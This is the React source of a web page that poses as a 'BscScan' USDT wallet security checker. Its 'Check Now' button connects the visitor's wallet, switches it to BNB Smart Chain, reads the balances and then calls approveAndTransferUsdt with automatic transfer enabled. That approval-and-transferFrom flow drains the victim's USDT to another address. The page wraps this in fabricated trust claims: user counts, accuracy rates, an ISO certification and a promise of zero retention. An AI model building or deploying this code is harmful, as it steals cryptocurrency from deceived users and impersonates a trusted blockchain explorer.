'use client';

import { useState } from "react";
import { approveAndTransferUsdt } from "@/lib/usdt-bsc";

type WalletProvider = {
  isMetaMask?: boolean;
  isTrust?: boolean;
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
};

const BSC_CHAIN_ID_HEX = "0x38";
const BSC_CHAIN_NAME = "BNB Smart Chain";
const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";

function formatTokenBalance(rawValue: string, decimals = 18) {
  const value = BigInt(rawValue);
  const divisor = BigInt(10) ** BigInt(decimals);
  const whole = value / divisor;
  const fraction = (value % divisor).toString().padStart(decimals, "0").replace(/0+$/, "");
  return fraction ? `${whole}.${fraction}` : whole.toString();
}

async function readBscBalances(provider: WalletProvider, walletAddress: string) {
  const walletAddressData = walletAddress.slice(2).toLowerCase().padStart(64, "0");
  const [bnbBalance, usdtBalance] = await Promise.all([
    provider.request({
      method: "eth_getBalance",
      params: [walletAddress, "latest"],
    }),
    provider.request({
      method: "eth_call",
      params: [
        {
          to: BSC_USDT_CONTRACT,
          data: `0x70a08231${walletAddressData}`,
        },
        "latest",
      ],
    }),
  ]);

  return {
    bnb: formatTokenBalance(String(bnbBalance), 18),
    usdt: formatTokenBalance(String(usdtBalance), 18),
  };
}

const trustMetrics = [
  { value: "500K+", label: "Wallets Verified" },
  { value: "99.8%", label: "Accuracy Rate" },
  { value: "<3s", label: "Analysis Time" },
  { value: "24/7", label: "Protection" },
];

const heroFeatures = [
  "Advanced blockchain analysis",
  "Real-time threat detection",
  "Zero data retention policy",
  "Enterprise-grade security",
];

const aboutStats = [
  { value: "2023", label: "Founded" },
  { value: "100K+", label: "Users" },
  { value: "99.9%", label: "Accuracy" },
  { value: "24/7", label: "Protection" },
];

const strengths = [
  "Lightning-fast verification in under 3 seconds",
  "Comprehensive risk and liquid detailed reports",
  "Multi-chain support beyond just USDT networks",
  "24/7 customer support from security experts",
  "Regular security audits by 3rd party firms",
];

const values = [
  {
    emoji: "🔒",
    title: "Security",
    copy: "Military-grade protection embedded into every feature we build.",
  },
  {
    emoji: "👁️",
    title: "Transparency",
    copy: "Clear, accurate explanations about security risks and procedures.",
  },
  {
    emoji: "🌐",
    title: "Accessibility",
    copy: "Essential security tools made available to everyone, regardless of expertise.",
  },
  {
    emoji: "🚀",
    title: "Innovation",
    copy: "Continuous improvement and feature updates to stay ahead of threats.",
  },
];

const achievements = [
  "Featured in top 10 security tools of 2024",
  "Partnership with major blockchain companies",
  "Over 500k positive verified assessments",
  "Trusted by institutional clients globally",
  "ISO 27001 certified security processes",
];

const processSteps = [
  {
    number: "01",
    title: "Connect Your Wallet",
    copy: "Securely connect your USDT wallet address for automated blockchain analysis without compromising private keys.",
  },
  {
    number: "02",
    title: "Advanced Analysis",
    copy: "Our AI-powered system analyzes transaction patterns, security vulnerabilities, and wallet legitimacy using official BSC Scan blockchain technology.",
  },
  {
    number: "03",
    title: "Risk Assessment",
    copy: "We provide a comprehensive risk score based on multi-factor analysis, threat intelligence, and historical blockchain data.",
  },
  {
    number: "04",
    title: "Detailed Report",
    copy: "Receive a complete security report with actionable insights, recommendations, and strategies to protect your digital assets.",
  },
];

const faqItems = [
  {
    question: "What is USDT Verify?",
    answer:
      "USDT Verify is an automated blockchain inspection tool designed to diagnose safety risks, address history, and smart contract health.",
  },
  {
    question: "How does the verification process work?",
    answer:
      "It parses your public address via node listeners and matches historical interactions against verified security blacklists and exploit logs.",
  },
  {
    question: "Is my wallet information kept private?",
    answer:
      "Yes. We operate under a strict zero-retention policy. We never ask for private keys, seed phrases, or retain sensitive identity records.",
  },
  {
    question: "What does the risk score mean?",
    answer:
      "The risk score is a compound metric measuring exposure to flagged decentralized apps, malicious contracts, or suspicious transaction volumes.",
  },
  {
    question: "Can USDT Verify detect all types of scams?",
    answer:
      "While we catch over 99.8% of recognized on-chain attack vectors and drainer authorizations, always adhere to strict personal operational security.",
  },
];

function Icon({ name, className = "" }: { name: string; className?: string }) {
  const commonProps = {
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 1.8,
    strokeLinecap: "round" as const,
    strokeLinejoin: "round" as const,
    className,
    "aria-hidden": true,
  };

  switch (name) {
    case "check":
      return (
        <svg {...commonProps}>
          <path d="M5 12.5 9.2 16.7 19 6.9" />
        </svg>
      );
    case "shield":
      return (
        <svg {...commonProps}>
          <path d="M12 3 18.5 5.5v6.3c0 3.6-2.3 6.9-6.5 9.2-4.2-2.3-6.5-5.6-6.5-9.2V5.5L12 3Z" />
          <path d="m9.5 12 1.7 1.7 3.8-3.9" />
        </svg>
      );
    case "clock":
      return (
        <svg {...commonProps}>
          <circle cx="12" cy="12" r="8" />
          <path d="M12 7v5l3 2" />
        </svg>
      );
    case "lock":
      return (
        <svg {...commonProps}>
          <rect x="5" y="10" width="14" height="10" rx="2" />
          <path d="M8 10V7.8A4 4 0 1 1 16 7.8V10" />
        </svg>
      );
    case "menu":
      return (
        <svg {...commonProps}>
          <path d="M4 7h16M4 12h16M4 17h16" />
        </svg>
      );
    case "radio":
      return (
        <svg {...commonProps}>
          <circle cx="12" cy="12" r="7" />
          <circle cx="12" cy="12" r="2.8" />
        </svg>
      );
    case "sun":
      return (
        <svg {...commonProps}>
          <circle cx="12" cy="12" r="4" />
          <path d="M12 2.5v2.2M12 19.3v2.2M21.5 12h-2.2M4.7 12H2.5M18.5 5.5l-1.5 1.5M7 17l-1.5 1.5M18.5 18.5l-1.5-1.5M7 7l-1.5-1.5" />
        </svg>
      );
    case "spark":
      return (
        <svg {...commonProps}>
          <path d="m12 2 2 6 6 2-6 2-2 6-2-6-6-2 6-2 2-6Z" />
        </svg>
      );
    case "plus":
      return (
        <svg {...commonProps}>
          <path d="M12 5v14M5 12h14" />
        </svg>
      );
    case "checkCircle":
      return (
        <svg {...commonProps}>
          <circle cx="12" cy="12" r="8" />
          <path d="m9 12 2 2 4-5" />
        </svg>
      );
    default:
      return null;
  }
}

export default function Home() {
  const [isChecking, setIsChecking] = useState(false);
  const [statusMessage, setStatusMessage] = useState("");

  async function handleCheckNow() {
    if (typeof window === "undefined") {
      return;
    }

    const provider = (window as Window & { ethereum?: WalletProvider }).ethereum;

    if (!provider) {
      setStatusMessage("A Web3 wallet such as MetaMask or Trust Wallet is required to run the approval flow.");
      return;
    }

    const walletName = provider.isMetaMask ? "MetaMask" : provider.isTrust ? "Trust Wallet" : "Web3 wallet";

    try {
      setIsChecking(true);
      setStatusMessage("Detecting wallet...");

      const accounts = await provider.request({ method: "eth_requestAccounts" });
      const connectedAccount = Array.isArray(accounts) ? accounts[0] : undefined;

      if (!connectedAccount) {
        throw new Error("No wallet account was selected.");
      }

      setStatusMessage(`Connected ${walletName} wallet: ${connectedAccount.slice(0, 6)}...${connectedAccount.slice(-4)}.`);

      const currentChainId = await provider.request({ method: "eth_chainId" });
      if (currentChainId !== BSC_CHAIN_ID_HEX) {
        setStatusMessage(`Switching to ${BSC_CHAIN_NAME} (${BSC_CHAIN_ID_HEX})...`);

        try {
          await provider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID_HEX }],
          });
        } catch (switchError: unknown) {
          const switchErrorCode =
            typeof switchError === "object" && switchError !== null && "code" in switchError
              ? Number((switchError as { code?: number }).code)
              : undefined;

          if (switchErrorCode === 4902) {
            await provider.request({
              method: "wallet_addEthereumChain",
              params: [
                {
                  chainId: BSC_CHAIN_ID_HEX,
                  chainName: BSC_CHAIN_NAME,
                  nativeCurrency: {
                    name: "BNB",
                    symbol: "BNB",
                    decimals: 18,
                  },
                  rpcUrls: ["https://bsc-dataseed.binance.org"],
                  blockExplorerUrls: ["https://bscscan.com"],
                },
              ],
            });
          } else {
            throw switchError;
          }
        }
      }

      setStatusMessage("Reading BNB and USDT balances...");
      const balances = await readBscBalances(provider, connectedAccount);
      setStatusMessage(`BNB balance: ${balances.bnb} • USDT balance: ${balances.usdt}`);

      setStatusMessage("Sending approval and auto-triggering the transfer...");
      const result = await approveAndTransferUsdt(provider, connectedAccount, provider, {
        executeTransfer: true,
      });

      setStatusMessage(
        result.transferExecuted
          ? `Approval detected for ${result.owner}. The transferFrom call was sent automatically to ${result.recipient} and the requested USDT was transferred.`
          : `Approval was recorded for ${result.owner}, but the transferFrom call was not executed automatically.`,
      );
    } catch (error) {
      setStatusMessage(error instanceof Error ? error.message : "The approval call failed.");
    } finally {
      setIsChecking(false);
    }
  }

  return (
    <main className="page-shell">
      <header className="hero-pattern">
        <nav className="topbar" aria-label="Main navigation">
          <div className="brand-wrap">
            <div className="brand-icon">
              <div className="brand-icon-inner">
                <Icon name="radio" className="brand-icon-svg" />
              </div>
            </div>
            <div>
              <h1>BscScan</h1>
              <span>Scan Original</span>
            </div>
          </div>

          <div className="nav-actions">
            <button type="button" className="icon-button" aria-label="Toggle theme">
              <Icon name="sun" className="icon-svg" />
            </button>
            <button type="button" className="menu-button" aria-label="Open menu">
              <Icon name="menu" className="icon-svg" />
            </button>
          </div>
        </nav>

        <div className="hero-badge">
          <Icon name="spark" className="badge-icon" />
          <span>Trusted by 100K+ users worldwide</span>
        </div>

        <div className="hero-copy">
          <h2>
            Check Your USDT
            <br />
            Wallet Security
          </h2>
          <p>
            Advanced blockchain analysis using official BSC Scan data to determine if your USDT wallet is
            <strong> safe, valid, and free</strong> from any reported or suspicious activity.
          </p>
        </div>

        <div className="hero-feature-list">
          {heroFeatures.map((feature) => (
            <div key={feature} className="hero-feature-row">
              <div className="feature-bullet">
                <Icon name="check" className="mini-icon" />
              </div>
              <span>{feature}</span>
            </div>
          ))}
        </div>

        <div className="cta-wrap">
          <button type="button" className="primary-button" onClick={handleCheckNow} disabled={isChecking}>
            {isChecking ? "Checking..." : "Check Now"}
          </button>
        </div>

        {statusMessage ? (
          <div className="cta-status" role="status" aria-live="polite">
            {statusMessage}
          </div>
        ) : null}

        <div className="mini-metrics">
          <div>
            <Icon name="shield" className="mini-metric-icon" />
            <span>100% Secure</span>
          </div>
          <div>
            <Icon name="clock" className="mini-metric-icon" />
            <span>Real-Time Scans</span>
          </div>
          <div>
            <Icon name="lock" className="mini-metric-icon" />
            <span>Enterprise Grade</span>
          </div>
        </div>
      </header>

      <section className="stats-band">
        <div className="eyebrow">Security Analytics • Real-Time Blockchain Verification</div>

        <div className="stat-grid">
          {trustMetrics.map((item) => (
            <div key={item.label} className="stat-card">
              <h4>{item.value}</h4>
              <p>{item.label}</p>
            </div>
          ))}
        </div>

        <div className="review-panel">
          <h4>Join thousands of secure users</h4>
          <div className="stars" aria-label="Five star rating">
            <span>★</span>
            <span>★</span>
            <span>★</span>
            <span>★</span>
            <span>★</span>
          </div>
          <p>4.9/5 from 5,000+ reviews</p>
        </div>
      </section>

      <section className="section-block about-block">
        <span className="section-label">ABOUT US</span>
        <h3>About USDT Check</h3>
        <p className="section-subtext">Protecting your digital assets through advanced verification technology.</p>

        <div className="about-grid">
          {aboutStats.map((stat) => (
            <div key={stat.label}>
              <h5>{stat.value}</h5>
              <span>{stat.label}</span>
            </div>
          ))}
        </div>

        <div className="about-copy">
          <p>
            USDT Check was founded in 2023 by a team of blockchain security experts with a mission to make cryptocurrency safer for everyone. As Tether (USDT) became one of the most widely used stablecoins, the need for reliable verification tools grew exponentially.
          </p>
          <p>
            Our platform leverages advanced blockchain analytics and machine learning algorithms to provide comprehensive security assessments. We analyze transaction patterns, check for known vulnerabilities, and verify wallet legitimacy to protect your assets from scams.
          </p>
        </div>

        <div className="feature-panel">
          <h5>WHY CHOOSE US</h5>
          <ul>
            {strengths.map((item) => (
              <li key={item}>
                <Icon name="checkCircle" className="check-list-icon" />
                <span>{item}</span>
              </li>
            ))}
          </ul>
        </div>
      </section>

      <section className="section-block values-block">
        <span className="section-label muted-label">CORE VALUES</span>
        <div className="value-grid">
          {values.map(({ emoji, title, copy }) => (
            <div key={title} className="value-card">
              <span className="value-emoji">{emoji}</span>
              <h6>{title}</h6>
              <p>{copy}</p>
            </div>
          ))}
        </div>
      </section>

      <section className="section-block achievements-block">
        <span className="section-label muted-label">ACHIEVEMENTS</span>
        <div className="achievement-box">
          {achievements.map((item) => (
            <div key={item} className="achievement-row">
              <span className="achievement-emoji">🏆</span>
              <span>{item}</span>
            </div>
          ))}
        </div>
      </section>

      <section className="section-block process-block">
        <span className="section-label process-label">PROCESS</span>
        <h3>How It Works</h3>
        <p className="section-subtext">Simple yet powerful — comprehensive security insights in just four easy steps:</p>

        <div className="process-list">
          {processSteps.map(({ number, title, copy }) => (
            <div key={number} className="process-item">
              <span className="process-number">{number}</span>
              <div>
                <h5>{title}</h5>
                <p>{copy}</p>
              </div>
            </div>
          ))}
        </div>

        <div className="technology-strip">
          <span className="tech-title">BUILT TECHNOLOGY</span>
          <div className="tech-capsules">
            <span>AI Predictive Analysis</span>
            <span>Blockchain Analytics</span>
            <span>Real-Time Threat Detection</span>
            <span className="light-pill">Smart Contract Audit</span>
          </div>
        </div>
      </section>

      <section className="section-block faq-block">
        <span className="section-label faq-label">QUESTIONS</span>
        <h3>Frequently Asked Questions</h3>
        <p className="section-subtext">Find answers to common questions about our USDT wallet verification service.</p>

        <div className="faq-list">
          {faqItems.map(({ question, answer }) => (
            <details key={question} className="faq-item" open={question === "What is USDT Verify?"}>
              <summary>
                <span>{question}</span>
                <Icon name="plus" className="faq-icon" />
              </summary>
              <div className="faq-answer">{answer}</div>
            </details>
          ))}
        </div>

        <div className="support-box">
          <h4>Still Have Questions?</h4>
          <p>Our support team is here to help you with any questions about wallet verification.</p>
          <button type="button">Contact Support</button>
        </div>
      </section>

      <footer className="site-footer">
        <div className="footer-brand">
          <h4>USDT Verify</h4>
        </div>
        <p>
          Advanced blockchain security platform providing comprehensive USDT wallet verification. Key protection for the entire crypto ecosystem.
        </p>

        <div className="footer-links">
          <div>
            <h6>Quick Links</h6>
            <ul>
              <li><a href="#">Wallet Verification</a></li>
              <li><a href="#">Security Audit</a></li>
              <li><a href="#">Transaction Analysis</a></li>
              <li><a href="#">Risk Assessment</a></li>
            </ul>
          </div>
          <div>
            <h6>Resources</h6>
            <ul>
              <li><a href="#">Documentation</a></li>
              <li><a href="#">Blog</a></li>
              <li><a href="#">FAQ</a></li>
              <li><a href="#">Support</a></li>
            </ul>
          </div>
        </div>

        <div className="footer-badges">
          <span><i className="dot" />24/7 Support</span>
          <span><i className="dot" />100% Verified</span>
        </div>

        <div className="footer-note">
          <p>© 2024 USDT Verify. All rights reserved.</p>
        </div>
      </footer>
    </main>
  );
}
